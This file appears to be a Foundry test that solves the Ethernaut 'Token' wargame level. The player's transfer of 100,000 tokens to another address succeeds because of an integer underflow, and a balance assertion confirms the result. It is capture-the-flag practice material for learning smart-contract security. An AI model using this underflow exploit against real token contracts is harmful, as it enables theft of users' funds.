// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Token.sol";
import "src/levels/TokenFactory.sol";

contract TestToken is BaseTest {
    Token private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new TokenFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Token(levelAddress);
    }

    function exploitLevel() internal override {
        vm.startPrank(address(player));
        level.transfer(address(101), 100000);

        vm.stopPrank();
        assertEq(level.balanceOf(address(101)), 100000);
    }
}

